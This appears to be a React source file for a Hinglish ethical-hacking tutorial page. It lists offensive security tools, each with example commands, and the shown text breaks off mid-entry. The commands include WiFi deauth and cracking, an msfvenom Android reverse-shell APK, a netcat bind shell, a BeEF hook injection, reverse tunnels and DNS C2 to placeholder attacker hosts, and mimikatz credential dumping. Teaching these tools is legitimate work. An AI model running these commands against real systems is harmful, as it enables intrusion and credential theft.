import { useState } from 'react'
import { Link } from 'react-router-dom'
import TutorialLayout from '../components/TutorialLayout'
import CodeBlock from '../components/CodeBlock'

const tools = [
  {
    name: 'aircrack-ng',
    slug: 'aircrack-ng',
    category: 'WiFi',
    description: 'WiFi network security assessment ka complete suite. Ismein airmon-ng (monitor mode), airodump-ng (packet capture), aireplay-ng (packet injection), aur aircrack-ng (password cracking) sab shaamil hain. WiFi hacking ka sabse important tool hai jo har ethical hacker ko aana chahiye.',
    commands: [
      'sudo airmon-ng start wlan0          # Monitor mode enable karein',
      'sudo airodump-ng wlan0mon            # Networks scan karein',
      'sudo aireplay-ng --deauth 10 -a BSSID wlan0mon  # Deauth attack',
      'sudo aircrack-ng capture.cap -w wordlist.txt     # Password crack karein',
    ],
  },
  {
    name: 'nmap',
    slug: 'nmap',
    category: 'Recon',
    description: 'Network exploration aur security auditing tool. Nmap se aap network par kaunse devices hain, kaunse ports open hain, kaunsi services chal rahi hain, aur operating system kya hai — sab pata kar sakte hain. Har penetration test mein nmap se hi shuru hota hai.',
    commands: [
      'nmap -sn 192.168.1.0/24       # Network scan — kaunse devices hain',
      'nmap -sV -sC target_ip        # Services aur versions detect karein',
      'nmap -A -T4 target_ip         # Aggressive scan — OS, services, scripts',
      'nmap --script vuln target_ip  # Vulnerability scan chalayein',
    ],
  },
  {
    name: 'metasploit-framework',
    slug: 'metasploit-framework',
    category: 'Exploitation',
    description: 'Duniya ka sabse popular penetration testing framework. 2000+ exploits, 500+ payloads, aur bahut saare auxiliary modules. Exploitation, post-exploitation, aur payload generation sab ek jagah. Har ethical hacker ke toolbox mein hona chahiye.',
    commands: [
      'msfconsole                           # Metasploit start karein',
      'use exploit/multi/handler            # Listener setup karein',
      'msfvenom -p android/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -o payload.apk',
      'search type:exploit platform:android # Android exploits search karein',
    ],
  },
  {
    name: 'bettercap',
    slug: 'bettercap',
    category: 'Network',
    description: 'Network attacks ke liye Swiss army knife. WiFi, BLE, aur Ethernet sab support karta hai. MITM (Man-in-the-Middle), packet sniffing, ARP spoofing, DNS spoofing, aur bahut kuch ek tool mein. Modern alternative hai ettercap ka.',
    commands: [
      'sudo bettercap           # Bettercap start karein',
      'wifi.recon on            # WiFi reconnaissance enable karein',
      'ble.recon on             # BLE reconnaissance enable karein',
      'arp.spoof on             # ARP spoofing enable karein (MITM)',
    ],
  },
  {
    name: 'wifite',
    slug: 'wifite',
    category: 'WiFi',
    description: 'Automated WiFi attack tool. Sab attacks automatically try karta hai — WPS PIN, PMKID, WPA handshake capture aur crack. Beginners ke liye best hai kyunki manually alag alag tools nahi chalane padte. Ek command mein sab kuch.',
    commands: [
      'sudo wifite                                # Automated WiFi attack',
      'sudo wifite --dict /usr/share/wordlists/rockyou.txt  # Custom wordlist',
      'sudo wifite -b AA:BB:CC:DD:EE:FF           # Specific target',
    ],
  },
  {
    name: 'sqlmap',
    slug: 'sqlmap',
    category: 'Web',
    description: 'Automatic SQL injection detection aur exploitation tool. SQL injection ek web vulnerability hai jahan attacker database queries manipulate kar sakta hai. sqlmap automatically injection type detect karta hai, data extract karta hai, aur kabhi kabhi full system access bhi de sakta hai.',
    commands: [
      'sqlmap -u "http://target/page?id=1"   # SQL injection test karein',
      'sqlmap -u URL --dbs                    # Sab databases list karein',
      'sqlmap -u URL -D database --tables     # Tables list karein',
      'sqlmap -u URL --os-shell               # Operating system shell lein',
    ],
  },
  {
    name: 'hydra',
    slug: 'hydra',
    category: 'Passwords',
    description: 'Fast network login cracker. SSH, FTP, HTTP, SMB, RDP, MySQL — 50+ protocols support karta hai. Dictionary attack aur brute force dono karta hai. Kamzor passwords dhundhne ke liye bahut useful hai.',
    commands: [
      'hydra -l admin -P wordlist.txt target ssh     # SSH brute force',
      'hydra -l user -P pass.txt target ftp          # FTP brute force',
      'hydra -L users.txt -P pass.txt target http-post-form  # Web login',
    ],
  },
  {
    name: 'john',
    slug: 'john',
    category: 'Passwords',
    description: 'John the Ripper — password hash cracker. MD5, SHA, bcrypt, NTLM, aur bahut saare hash types support karta hai. Jab aap hash files (jaise /etc/shadow) capture kar lein toh John se passwords crack kar sakte hain.',
    commands: [
      'john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt  # Dictionary attack',
      'john --show hashes.txt              # Cracked passwords dikhao',
      'john --format=md5 hashes.txt        # Specific hash type',
    ],
  },
  {
    name: 'hashcat',
    slug: 'hashcat',
    category: 'Passwords',
    description: 'Advanced GPU-accelerated password recovery tool. CPU se bahut zyada fast hai kyunki GPU parallel processing use karta hai. WPA2, MD5, SHA, NTLM — 300+ hash modes support karta hai. Professional password cracking ke liye standard tool hai.',
    commands: [
      'hashcat -m 0 hashes.txt wordlist.txt           # MD5 crack',
      'hashcat -m 16800 pmkid.txt wordlist.txt         # WPA2 PMKID crack',
      'hashcat -m 2500 wpa.hccapx wordlist.txt         # WPA2 handshake crack',
    ],
  },
  {
    name: 'nikto',
    slug: 'nikto',
    category: 'Web',
    description: 'Web server scanner. Dangerous files, outdated software versions, server misconfigurations, aur known vulnerabilities check karta hai. Web server ki initial security assessment ke liye bahut accha hai.',
    commands: [
      'nikto -h http://target                   # Web server scan',
      'nikto -h target -p 80,443                # Specific ports',
      'nikto -h target -output report.html      # HTML report banayein',
    ],
  },
  {
    name: 'burpsuite',
    slug: 'burpsuite',
    category: 'Web',
    description: 'Web application security testing ka integrated platform. Proxy, scanner, intruder, repeater — sab ek jagah. HTTP/HTTPS traffic intercept aur modify kar sakta hai. Web penetration testers ka primary tool hai.',
    commands: [
      'burpsuite                          # Burp Suite launch karein',
      '# Browser proxy set karein: 127.0.0.1:8080',
      '# HTTP requests intercept aur modify karein',
      '# Automated scan chalayein vulnerabilities ke liye',
    ],
  },
  {
    name: 'reaver',
    slug: 'reaver',
    category: 'WiFi',
    description: 'WPS brute force attack tool. WPS (WiFi Protected Setup) ka PIN vulnerability exploit karta hai. Agar router ka WPS enabled hai aur locked nahi hai toh reaver se password mil sakta hai bina wordlist ke.',
    commands: [
      'sudo reaver -i wlan0mon -b BSSID -vv   # WPS PIN attack',
      'wash -i wlan0mon                         # WPS-enabled networks scan',
    ],
  },
  {
    name: 'wireshark',
    slug: 'wireshark',
    category: 'Network',
    description: 'Network protocol analyzer. Har packet capture aur analyze kar sakta hai. TCP, UDP, HTTP, DNS, aur 1000+ protocols decode karta hai. Network troubleshooting aur security analysis ke liye essential tool hai.',
    commands: [
      'sudo wireshark                    # GUI mode mein launch',
      'sudo tshark -i wlan0              # Command line capture',
      'sudo tshark -i wlan0 -w capture.pcap  # File mein save',
    ],
  },
  {
    name: 'setoolkit',
    slug: 'setoolkit',
    category: 'Social',
    description: 'Social-Engineer Toolkit. Phishing attacks, credential harvesting, website cloning, payload generation, aur social engineering ke liye complete framework hai. SET se aap realistic phishing pages banakar credentials capture kar sakte hain.',
    commands: [
      'sudo setoolkit                     # SET launch karein',
      '# 1) Social-Engineering Attacks',
      '# 2) Website Attack Vectors',
      '# 3) Credential Harvester Attack',
    ],
  },
  {
    name: 'responder',
    slug: 'responder',
    category: 'Network',
    description: 'LLMNR/NBT-NS/MDNS poisoner. Local network par jab computers naam se services dhundhte hain toh Responder un requests ko poison karke NTLMv2 hashes capture karta hai. Internal penetration testing mein bahut effective hai.',
    commands: [
      'sudo responder -I eth0             # Poisoning start karein',
      'sudo responder -I wlan0 -wrf       # WPAD, fingerprinting ke saath',
    ],
  },
  {
    name: 'gobuster',
    slug: 'gobuster',
    category: 'Web',
    description: 'Directory/file brute-forcing tool web servers ke liye. Website par hidden directories, files, aur subdomains dhundhta hai jo directly linked nahi hain. Bug bounty mein bahut useful hai.',
    commands: [
      'gobuster dir -u http://target -w wordlist.txt     # Directory brute force',
      'gobuster dns -d target.com -w subdomains.txt      # Subdomain enum',
      'gobuster dir -u http://target -w list.txt -x php,html,txt  # File extensions',
    ],
  },
  {
    name: 'netcat',
    slug: 'netcat',
    category: 'Network',
    description: 'TCP/IP Swiss army knife. Network connections create, read, aur write kar sakta hai. Port scanning, file transfer, backdoor, aur reverse shell sab ek simple tool se. Bahut lightweight lekin bahut powerful.',
    commands: [
      'nc -lvp 4444                       # Listener start karein (port 4444)',
      'nc target_ip 4444                  # Target se connect karein',
      'nc -lvp 4444 -e /bin/bash         # Bash shell serve karein (bind shell)',
    ],
  },
  {
    name: 'masscan',
    slug: 'masscan',
    category: 'Recon',
    description: 'Duniya ka sabse fast port scanner. Poori Internet ko 6 minutes mein scan kar sakta hai. Bahut bada network range scan karne ke liye perfect hai. Initial reconnaissance mein use hota hai.',
    commands: [
      'masscan 192.168.1.0/24 -p 80,443        # Local network scan',
      'masscan 10.0.0.0/8 -p 22 --rate 10000   # Bada range fast scan',
    ],
  },
  {
    name: 'hcxdumptool',
    slug: 'hcxdumptool',
    category: 'WiFi',
    description: 'PMKID capture tool. Bina kisi connected client ke WPA/WPA2 ka PMKID capture kar sakta hai. Agar router vulnerable hai toh handshake ka wait nahi karna padta. Modern WiFi attack ka standard tool hai.',
    commands: [
      'sudo hcxdumptool -i wlan0mon -o capture.pcapng    # PMKID capture',
      'hcxpcapngtool capture.pcapng -o hash.txt           # Hashcat format convert',
    ],
  },
  {
    name: 'wpscan',
    slug: 'wpscan',
    category: 'Web',
    description: 'WordPress security scanner. WordPress websites ke plugins, themes, aur core mein known vulnerabilities dhundhta hai. WordPress duniya ka sabse popular CMS hai isliye iska scanner bhi bahut important hai.',
    commands: [
      'wpscan --url http://target             # WordPress scan',
      'wpscan --url http://target --enumerate u  # Users enumerate',
      'wpscan --url http://target --enumerate vp # Vulnerable plugins',
    ],
  },
  {
    name: 'macchanger',
    slug: 'macchanger',
    category: 'Network',
    description: 'MAC address change karne ka tool. MAC address har network device ka unique identifier hota hai. MAC spoofing se aap apni identity hide kar sakte ho ya kisi network mein apna device different dikhane ke liye use kar sakte ho.',
    commands: [
      'sudo macchanger -r wlan0                  # Random MAC set karein',
      'sudo macchanger -m AA:BB:CC:DD:EE:FF wlan0  # Specific MAC set karein',
      'sudo macchanger -p wlan0                  # Original MAC restore karein',
      'macchanger -s wlan0                       # Current MAC dekhein',
    ],
  },
  {
    name: 'enum4linux',
    slug: 'enum4linux',
    category: 'Recon',
    description: 'SMB/Windows enumeration tool. Windows networks mein shares, users, groups, policies sab nikal sakta hai. Samba aur Windows systems ki information gather karne ke liye best tool hai.',
    commands: [
      'enum4linux -a target_ip              # Full enumeration',
      'enum4linux -U target_ip              # Users list',
      'enum4linux -S target_ip              # Shares list',
      'enum4linux -G target_ip              # Groups list',
    ],
  },
  {
    name: 'dnsenum',
    slug: 'dnsenum',
    category: 'Recon',
    description: 'DNS enumeration tool. Domain ki DNS records, subdomains, zone transfers sab check karta hai. DNS se bahut saari information milti hai jo target ke baare mein batati hai.',
    commands: [
      'dnsenum target.com                   # Full DNS enumeration',
      'dnsenum --enum target.com            # Detailed enumeration',
      'dnsenum -f subdomains.txt target.com # Custom subdomain list',
    ],
  },
  {
    name: 'whois',
    slug: 'whois',
    category: 'Recon',
    description: 'Domain registration information nikalne ka tool. Domain owner ka naam, email, phone number, registration date, hosting provider — sab kuch. OSINT ke liye bahut important hai.',
    commands: [
      'whois target.com                     # Domain info nikalein',
      'whois 192.168.1.1                    # IP address info',
    ],
  },
  {
    name: 'dnsrecon',
    slug: 'dnsrecon',
    category: 'Recon',
    description: 'DNS reconnaissance tool. DNS records, zone transfers, subdomain brute force, cache snooping — sab ek tool mein. Nmap ke saath combined use se bahut acche results milte hain.',
    commands: [
      'dnsrecon -d target.com               # Standard scan',
      'dnsrecon -d target.com -t std        # Standard records',
      'dnsrecon -d target.com -t brt -D subdomains.txt  # Brute force',
    ],
  },
  {
    name: 'theharvester',
    slug: 'theharvester',
    category: 'Recon',
    description: 'Email, subdomain, aur name ka OSINT tool. Public sources jaise search engines, PGP key servers se emails aur subdomains collect karta hai. Social engineering aur phishing se pehle reconnaissance ke liye use hota hai.',
    commands: [
      'theHarvester -d target.com -b google   # Google se search',
      'theHarvester -d target.com -b all      # Sab sources se search',
      'theHarvester -d target.com -b linkedin # LinkedIn se names',
    ],
  },
  {
    name: 'sherlock',
    slug: 'sherlock',
    category: 'Recon',
    description: 'Social media username finder. Ek username se 300+ social media platforms par account dhundhta hai. OSINT investigation mein bahut useful hai — kisi ka poora online presence pata kar sakte ho.',
    commands: [
      'sherlock username                    # Sab platforms par search',
      'sherlock user1 user2 user3           # Multiple usernames',
      'sherlock username --output results.txt  # File mein save',
    ],
  },
  {
    name: 'dirb',
    slug: 'dirb',
    category: 'Web',
    description: 'Web content scanner aur directory brute forcer. Website par hidden directories, files, aur scripts dhundhta hai. Gobuster jaisa hi hai lekin purana aur reliable hai. Wordlist based attack karta hai.',
    commands: [
      'dirb http://target                   # Default wordlist se scan',
      'dirb http://target /usr/share/wordlists/dirb/common.txt  # Custom wordlist',
      'dirb http://target -X .php,.html     # Specific extensions',
    ],
  },
  {
    name: 'crunch',
    slug: 'crunch',
    category: 'Passwords',
    description: 'Custom wordlist generator tool. Aap apni requirements ke hisaab se wordlist bana sakte ho — length, characters, patterns sab define kar sakte ho. Password cracking ke liye custom wordlists bahut important hain.',
    commands: [
      'crunch 6 8 abcdef123456 -o wordlist.txt    # 6-8 char wordlist',
      'crunch 8 8 0123456789 -o digits.txt         # Only digits',
      'crunch 10 10 -t @@@@@@2024 -o custom.txt    # Pattern based',
    ],
  },
  {
    name: 'cewl',
    slug: 'cewl',
    category: 'Passwords',
    description: 'Website se custom wordlist banane ka tool. Website ka content crawl karke words extract karta hai jo passwords ho sakte hain. Target company ke website se wordlist banana bahut effective attack hai.',
    commands: [
      'cewl http://target.com -w wordlist.txt      # Website se words',
      'cewl http://target.com -d 2 -w words.txt    # 2 depth tak crawl',
      'cewl http://target.com -m 6 -w words.txt    # Minimum 6 characters',
    ],
  },
  {
    name: 'arp-scan',
    slug: 'arp-scan',
    category: 'Network',
    description: 'ARP protocol se local network scan karne ka tool. Nmap se fast hai local network ke liye. Sab connected devices ka IP aur MAC address milta hai. Hidden devices bhi mil sakte hain jo ping ka reply nahi dete.',
    commands: [
      'sudo arp-scan -l                     # Local network scan',
      'sudo arp-scan 192.168.1.0/24         # Specific range scan',
      'sudo arp-scan -I wlan0 -l            # Specific interface se',
    ],
  },
  {
    name: 'kismet',
    slug: 'kismet',
    category: 'WiFi',
    description: 'Wireless network detector, sniffer, aur intrusion detection system. WiFi, Bluetooth, aur doosre wireless signals detect karta hai. Passive mode mein kaam karta hai — koi packet send nahi karta isliye detect hona mushkil hai.',
    commands: [
      'sudo kismet                           # Kismet start karein',
      'sudo kismet -c wlan0                 # Specific interface se',
      '# Web UI: http://localhost:2501',
    ],
  },
  {
    name: 'pixiewps',
    slug: 'pixiewps',
    category: 'WiFi',
    description: 'WPS Pixie Dust attack tool. Kouters mein WPS ka ek vulnerability hai jisse PIN offline crack ho sakti hai — reaver se bahut fast. Agar router vulnerable hai toh seconds mein password mil sakta hai.',
    commands: [
      'sudo pixiewps -e PKE -r PKE -s E_HASH1 -z E_HASH2 -a E_NONCE -n R_NONCE  # Offline crack',
      '# Reaver ke saath use hota hai:',
      'sudo reaver -i wlan0mon -b BSSID -K 1  # Pixie Dust with reaver',
    ],
  },
  {
    name: 'eaphammer',
    slug: 'eaphammer',
    category: 'WiFi',
    description: 'WPA-Enterprise evil twin attack tool. Enterprise WiFi networks mein evil access point banakar credentials capture karta hai. Hostile portal attacks aur credential harvesting ke liye best tool hai.',
    commands: [
      'sudo python3 eaphammer -i wlan0 --essid "CorpWiFi" --creds  # Evil twin',
      'sudo python3 eaphammer -i wlan0 --essid "FreeWiFi" --hostile  # Hostile portal',
    ],
  },
  {
    name: 'mitmproxy',
    slug: 'mitmproxy',
    category: 'Network',
    description: 'Interactive HTTPS proxy. HTTP/HTTPS traffic intercept, modify, aur replay kar sakta hai. Burp Suite ka lightweight alternative hai command line ke liye. Mobile app testing mein bahut useful hai.',
    commands: [
      'mitmproxy                             # Start proxy (port 8080)',
      'mitmweb                               # Web interface ke saath',
      'mitmdump -w capture.txt               # Traffic file mein save',
    ],
  },
  {
    name: 'apktool',
    slug: 'apktool',
    category: 'Mobile',
    description: 'Android APK reverse engineering tool. APK files ko decompile karke resources, smali code, aur manifest file nikal sakta hai. Android malware analysis aur app modification ke liye essential tool hai.',
    commands: [
      'apktool d app.apk -o output_dir      # APK decompile karein',
      'apktool b output_dir -o modified.apk # Recompile karein',
      'apktool if framework-res.apk         # Framework install',
    ],
  },
  {
    name: 'frida',
    slug: 'frida',
    category: 'Mobile',
    description: 'Dynamic instrumentation toolkit. Running Android apps ko hook karke functions call, modify, aur monitor kar sakta hai. Runtime par app ke behavior ko change kar sakta hai bina source code ke.',
    commands: [
      'frida -U -f com.target.app -l script.js  # App ko hook karein',
      'frida-ps -U                               # Running processes list',
      'frida-trace -U -f com.target.app -j "*!*login*"  # Login functions trace',
    ],
  },
  {
    name: 'drozer',
    slug: 'drozer',
    category: 'Mobile',
    description: 'Android security testing framework. Android apps ke attack surface ko assess karta hai — activities, services, broadcast receivers, content providers sab test kar sakta hai.',
    commands: [
      'drozer console connect               # Drozer shell',
      'run app.package.list                 # Installed apps list',
      'run app.package.attacksurface com.target  # Attack surface',
      'run app.activity.start --component com.target/.MainActivity',
    ],
  },
  {
    name: 'objection',
    slug: 'objection',
    category: 'Mobile',
    description: 'Runtime mobile exploration toolkit. Frida based hai aur Android/iOS apps ko bina jailbreak/root ke explore kar sakta hai. SSL pinning bypass, memory dump, file system access sab ek tool mein.',
    commands: [
      'objection -g com.target.app explore  # App explore karein',
      'android sslpinning disable           # SSL pinning bypass',
      'android root disable                 # Root detection bypass',
      'memory dump all memory.bin           # Memory dump',
    ],
  },
  {
    name: 'recon-ng',
    slug: 'recon-ng',
    category: 'Recon',
    description: 'Full-featured web reconnaissance framework. Metasploit jaisa interface hai lekin OSINT ke liye. Modules se emails, hosts, contacts, leaks sab dhundh sakta hai. Database mein results store hote hain.',
    commands: [
      'recon-ng                              # Start recon-ng',
      'workspaces create target_workspace   # Workspace banayein',
      'modules load recon/domains-hosts/google_site_web  # Module load',
    ],
  },
  {
    name: 'hostapd-mana',
    slug: 'hostapd-mana',
    category: 'WiFi',
    description: 'Evil twin access point banane ka tool. Fake WiFi hotspot banakar users ko connect karwata hai. Captive portal se credentials capture kar sakta hai. Karma attacks ke liye best hai.',
    commands: [
      'sudo hostapd-mana hostapd.conf       # Evil AP start karein',
      '# Config mein SSID, channel, interface set karein',
      '# Captive portal se credentials capture karein',
    ],
  },
  {
    name: 'yersinia',
    slug: 'yersinia',
    category: 'Network',
    description: 'Layer 2 network attack tool. STP, CDP, DTP, DHCP, HSRP, VLAN — sab protocol attacks support karta hai. Switch-based networks mein attacks karne ke liye use hota hai.',
    commands: [
      'yersinia -G                           # GUI mode',
      'yersinia -I                           # Interactive mode',
      '# STP, CDP, DHCP attacks available',
    ],
  },
  {
    name: 'sslstrip',
    slug: 'sslstrip',
    category: 'Network',
    description: 'HTTPS ko HTTP mein convert karne ka tool. MITM attack ke saath use hota hai — jab victim HTTPS site open kare toh sslstrip usse HTTP par redirect kar deta hai aur traffic plain text mein milta hai.',
    commands: [
      'sslstrip -l 8080                     # SSLStrip start karein',
      '# iptables se traffic redirect karein:',
      'sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080',
    ],
  },
  {
    name: 'impacket',
    slug: 'impacket',
    category: 'Exploitation',
    description: 'Python network protocols collection. SMB, Kerberos, LDAP, MSSQL, WMI sab protocols ke liye tools hain. Windows/Active Directory penetration testing ke liye bahut important toolkit hai.',
    commands: [
      'psexec.py user:pass@target cmd.exe   # Remote command execution',
      'secretsdump.py user:pass@target      # Password hashes dump',
      'smbclient.py user:pass@target        # SMB access',
      'getTGT.py user:pass -dc-ip DC_IP    # Kerberos ticket',
    ],
  },
  {
    name: 'crackmapexec',
    slug: 'crackmapexec',
    category: 'Exploitation',
    description: 'Swiss army knife for Windows/Active Directory networks. SMB, WinRM, LDAP, MSSQL sab protocols test kar sakta hai. Credential validation, command execution, aur lateral movement ke liye best tool hai.',
    commands: [
      'crackmapexec smb 192.168.1.0/24 -u admin -p pass  # Network auth test',
      'crackmapexec smb target -u admin -p pass --shares  # Shares list',
      'crackmapexec smb target -u admin -p pass -x whoami # Command execute',
    ],
  },
  {
    name: 'mimikatz',
    slug: 'mimikatz',
    category: 'Passwords',
    description: 'Windows credential extraction tool. Memory se passwords, hashes, PINs, tickets sab extract kar sakta hai. Windows security ka sabse bada dushman hai. Kerberos attacks ke liye bhi use hota hai.',
    commands: [
      'mimikatz                              # Start mimikatz',
      'privilege::debug                     # Debug privileges',
      'sekurlsa::logonpasswords             # Login passwords dump',
      'kerberos::golden /user:admin /domain:target /sid:S-1-5...  # Golden ticket',
    ],
  },
  {
    name: 'bloodhound',
    slug: 'bloodhound',
    category: 'Exploitation',
    description: 'Active Directory attack path mapping tool. Graph database mein AD ka poora map banata hai — users, groups, computers, relationships sab. Attackers ko shortest path batata hai domain admin tak pahunchne ke liye.',
    commands: [
      '# SharpHound se data collect karein:',
      'sharpHound.exe -c All',
      '# BloodHound GUI mein import karein',
      '# Pre-built queries se attack paths dekhein',
    ],
  },
  {
    name: 'maltego',
    slug: 'maltego',
    category: 'Recon',
    description: 'OSINT aur link analysis ka GUI tool. Graph-based visualization se relationships dhundhta hai — domains, emails, IPs, people sab ke beech connections. Law enforcement aur intelligence agencies use karti hain.',
    commands: [
      'maltego                           # Maltego launch karein',
      '# Transform se data collect karein',
      '# Graph mein relationships dekhein',
    ],
  },
  {
    name: 'lynis',
    slug: 'lynis',
    category: 'Audit',
    description: 'Linux system security auditing tool. System ki 300+ security tests karta hai — configurations, permissions, packages, kernel sab check karta hai. Hardening ke liye recommendations deta hai.',
    commands: [
      'sudo lynis audit system            # Full system audit',
      'sudo lynis audit system --quick    # Quick scan',
      'sudo lynis show groups             # Test groups dekhein',
    ],
  },
  {
    name: 'chisel',
    slug: 'chisel',
    category: 'Tunneling',
    description: 'Fast TCP/UDP tunnel tool. SSH tunneling ka modern alternative hai. Firewall bypass karne ke liye use hota hai — SOCKS proxy, port forwarding sab ek tool mein.',
    commands: [
      '# Server side (attacker):',
      'chisel server -p 8080 --reverse',
      '# Client side (victim):',
      'chisel client ATTACKER_IP:8080 R:socks',
    ],
  },
  {
    name: 'evil-winrm',
    slug: 'evil-winrm',
    category: 'Exploitation',
    description: 'Windows Remote Management shell. WinRM se Windows machines par remote shell milta hai. PSExec ka alternative hai — zyada stealthy aur reliable hai. Active Directory pentesting mein use hota hai.',
    commands: [
      'evil-winrm -i target_ip -u admin -p password',
      'evil-winrm -i target_ip -u admin -H NTLM_HASH',
      '# Upload/download, PowerShell scripts sab support',
    ],
  },
  {
    name: 'subfinder',
    slug: 'subfinder',
    category: 'Recon',
    description: 'Passive subdomain discovery tool. 30+ sources se subdomains collect karta hai — VirusTotal, Shodan, Censys, ThreatCrowd sab. Fast hai aur API keys optional hain. Bug bounty hunters ka favorite hai.',
    commands: [
      'subfinder -d target.com            # Subdomains dhundhein',
      'subfinder -d target.com -o subs.txt  # File mein save',
      'subfinder -d target.com -all      # Sab sources se',
    ],
  },
  {
    name: 'ffuf',
    slug: 'ffuf',
    category: 'Web',
    description: 'Fast web fuzzer — directory, parameter, vhost sab fuzz kar sakta hai. Go mein likha gaya hai isliye bahut fast hai. Gobuster ka modern replacement hai with more features aur better performance.',
    commands: [
      'ffuf -u http://target.com/FUZZ -w wordlist.txt',
      'ffuf -u http://target.com -w params.txt -X POST -d "FUZZ=test"',
      'ffuf -u http://FUZZ.target.com -w subdomains.txt',
    ],
  },
  {
    name: 'trivy',
    slug: 'trivy',
    category: 'Audit',
    description: 'Container aur IaC security scanner. Docker images, Kubernetes, Terraform files mein vulnerabilities dhundhta hai. CI/CD pipeline mein integrate hota hai. DevSecOps ke liye essential tool hai.',
    commands: [
      'trivy image nginx:latest           # Docker image scan',
      'trivy fs .                         # Filesystem scan',
      'trivy config terraform/            # IaC scan',
    ],
  },
  {
    name: 'naabu',
    slug: 'naabu',
    category: 'Recon',
    description: 'Fast port scanner ProjectDiscovery ka. Go mein likha gaya hai aur SYN scan support karta hai. Nmap se fast hai lekin lightweight hai. Web reconnaissance pipelines mein use hota hai.',
    commands: [
      'naabu -host target.com             # Port scan',
      'naabu -host target.com -top-ports 1000  # Top ports',
      'naabu -list targets.txt -o ports.txt    # Multiple targets',
    ],
  },
  {
    name: 'nuclei',
    slug: 'nuclei',
    category: 'Web',
    description: 'Template-based vulnerability scanner. 5000+ templates hain — CVEs, misconfigurations, exposed panels, default credentials sab scan karta hai. ProjectDiscovery ka flagship tool hai. Automation ke liye best hai.',
    commands: [
      'nuclei -u http://target.com        # Basic scan',
      'nuclei -u http://target.com -t cves/  # Sirf CVEs',
      'nuclei -l urls.txt -o results.txt  # Multiple targets',
    ],
  },
  {
    name: 'katana',
    slug: 'katana',
    category: 'Recon',
    description: 'Web crawler aur spider tool. JavaScript-heavy websites ko bhi crawl kar sakta hai — headless browser support hai. URLs, endpoints, forms, links sab extract karta hai. Bug bounty reconnaissance ke liye best hai.',
    commands: [
      'katana -u http://target.com        # Crawl website',
      'katana -u http://target.com -d 2   # Depth 2 tak',
      'katana -u http://target.com -jc    # JavaScript crawl',
    ],
  },
  {
    name: 'tcpdump',
    slug: 'tcpdump',
    category: 'Network',
    description: 'Command-line packet analyzer. Network traffic capture aur analyze karta hai. Jab GUI available nahi hota tab tcpdump se packets capture kar sakte ho. Lightweight hai aur har Linux system par pre-installed aata hai.',
    commands: [
      'sudo tcpdump -i wlan0              # Interface par traffic capture',
      'sudo tcpdump -i wlan0 port 80      # HTTP traffic only',
      'sudo tcpdump -i wlan0 -w cap.pcap  # File mein save (Wireshark ke liye)',
      'sudo tcpdump -r capture.pcap       # File se read karein',
    ],
  },
  {
    name: 'amass',
    slug: 'amass',
    category: 'Recon',
    description: 'OWASP ka official attack surface mapping tool. 50+ data sources se subdomains dhundhta hai — VirusTotal, Shodan, Censys, Certificate Transparency logs sab. Sabse comprehensive subdomain enumeration tool hai.',
    commands: [
      'amass enum -passive -d target.com  # Passive subdomain discovery',
      'amass enum -d target.com -brute    # Brute force ke saath',
      'amass enum -d target.com -o subs.txt  # File mein save',
      'amass db -d target.com             # Database results dekhein',
    ],
  },
  {
    name: 'commix',
    slug: 'commix',
    category: 'Web',
    description: 'Automated command injection exploiter. Web applications mein OS command injection vulnerabilities dhundhta hai aur exploit karta hai. Blind, classic, aur reverse-based injections sab handle karta hai.',
    commands: [
      'commix -u "http://target/page?cmd=id"  # GET injection test',
      'commix -u "http://target" --data="user=admin"  # POST injection',
      'commix -u "http://target" --cookie="session=abc"  # Cookie injection',
    ],
  },
  {
    name: 'searchsploit',
    slug: 'searchsploit',
    category: 'Exploitation',
    description: 'Exploit-DB ka command-line search tool. 50,000+ exploits, shellcodes, aur papers ka local database. Bina internet ke bhi exploits search kar sakte ho. Jab kisi software ki version milti hai toh turant exploit dhundh sakte ho.',
    commands: [
      'searchsploit apache 2.4             # Apache 2.4 ke exploits',
      'searchsploit -e "remote code exec"  # Exact match search',
      'searchsploit -m 42031               # Exploit copy karein',
      'searchsploit -u                     # Database update',
    ],
  },
  {
    name: 'proxychains',
    slug: 'proxychains',
    category: 'Network',
    description: 'Traffic ko proxy servers ke through route karne ka tool. Kisi bhi TCP connection ko SOCKS4/SOCKS5/HTTP proxy se route kar sakta hai. Anonymity aur firewall bypass ke liye bahut important hai. Tor ke saath commonly use hota hai.',
    commands: [
      'proxychains nmap -sT target_ip      # Nmap proxy ke through',
      'proxychains curl http://target      # Web request anonymous',
      'proxychains ssh user@target         # SSH proxy ke through',
    ],
  },
  {
    name: 'beef-xss',
    slug: 'beef-xss',
    category: 'Exploitation',
    description: 'Browser Exploitation Framework. XSS vulnerabilities ke through browsers ko exploit karta hai. Hooked browser se keystrokes capture, cookie steal, phishing pages, network scanning sab kar sakte ho. Social engineering ke liye powerful tool hai.',
    commands: [
      'sudo beef-xss                      # BeEF start karein',
      '# Hook URL: http://YOUR_IP:3000/hook.js',
      '# Dashboard: http://127.0.0.1:3000/ui/panel',
      '# XSS mein inject: <script src=http://IP:3000/hook.js></script>',
    ],
  },
  {
    name: 'wafw00f',
    slug: 'wafw00f',
    category: 'Web',
    description: 'Web Application Firewall detection tool. 150+ WAFs identify kar sakta hai — Cloudflare, AWS WAF, ModSecurity, Akamai sab. Attack se pehle WAF detect karna zaroori hai taaki bypass technique use kar sako.',
    commands: [
      'wafw00f http://target.com           # WAF detect karein',
      'wafw00f -i targets.txt             # Multiple targets',
      'wafw00f http://target.com -o out.txt -f json  # JSON output',
    ],
  },
  {
    name: 'socat',
    slug: 'socat',
    category: 'Network',
    description: 'Advanced networking Swiss army knife. Netcat ka upgraded version — TCP, UDP, SSL, UNIX sockets sab support karta hai. Port forwarding, encrypted reverse shells, file transfer sab kar sakta hai. Bahut versatile tool hai.',
    commands: [
      'socat TCP-LISTEN:4444,reuseaddr -  # Listener start',
      'socat TCP:target:80 -              # TCP connection',
      'socat TCP-LISTEN:8080,reuseaddr TCP:target:80  # Port forward',
    ],
  },
  {
    name: 'dnscat2',
    slug: 'dnscat2',
    category: 'Tunneling',
    description: 'DNS tunneling C2 tool. DNS queries ke through encrypted communication channel banata hai. Firewall bypass ke liye powerful hai kyunki DNS traffic (port 53) zyada tar networks mein block nahi hota. Data exfiltration aur C2 ke liye use hota hai.',
    commands: [
      'sudo ruby dnscat2.rb --dns domain=attacker.com  # Server start',
      './dnscat2 attacker.com            # Client connect',
      '# Session mein: shell, download, upload commands',
    ],
  },
  {
    name: 'empire',
